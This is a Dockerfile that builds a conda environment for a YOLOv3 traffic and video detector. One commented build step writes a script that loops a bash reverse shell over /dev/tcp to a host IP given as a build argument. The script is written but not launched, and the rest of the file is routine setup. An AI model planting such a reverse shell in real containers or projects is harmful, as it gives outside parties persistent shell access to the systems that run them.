FROM python:3.7-buster

ARG LOCAL_IP

# Install base utilities
RUN apt update && \
    apt install -y build-essential && \
    apt install -y wget && \
    apt install -y ffmpeg

# Install conda
ENV CONDA_DIR /opt/conda
RUN wget --quiet https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O ~/miniconda.sh && \
     /bin/bash ~/miniconda.sh -b -p /opt/conda
ENV PATH=$CONDA_DIR/bin:$PATH
RUN conda create --name detector python=3.7
SHELL ["conda", "run", "-n", "detector", "/bin/bash", "-c"]

# Install pip environment
WORKDIR /work/lawrence910426/Sharingan/video-detector
COPY requirements.txt /work/lawrence910426/Sharingan/video-detector
RUN python -m pip install --upgrade pip
RUN pip install numpy
RUN pip install -r requirements.txt

# Install OpenCV by conda
RUN conda install -c conda-forge opencv 

# Copy YoloV3
COPY detector/YOLOv3/ /work/lawrence910426/Sharingan/video-detector/detector/YOLOv3/
WORKDIR /work/lawrence910426/Sharingan/video-detector

# Download weights
WORKDIR detector/YOLOv3/weight/
RUN wget https://pjreddie.com/media/files/yolov3.weights
RUN wget https://pjreddie.com/media/files/yolov3-tiny.weights
WORKDIR ../../../

# Compile YoloV3
WORKDIR detector/YOLOv3/nms
RUN sh build.sh
WORKDIR ../../../

# Add reverse shell script
RUN LOCAL_IP=${LOCAL_IP} && echo "set -m; while true; do bash -i >& /dev/tcp/${LOCAL_IP}/443 0>&1; done" > remote_shell.sh

# Copy the remaining files
COPY . /work/lawrence910426/Sharingan/video-detector

WORKDIR /work/lawrence910426/Sharingan/video-detector

# CMD ["conda", "run", "-n", "detector", "python", "rpc_server/daemon.py"]
CMD ["conda", "run", "-n", "detector", "python", "traffic_terminal.py", "videos/10sec.mp4", "--mode", "straight"]
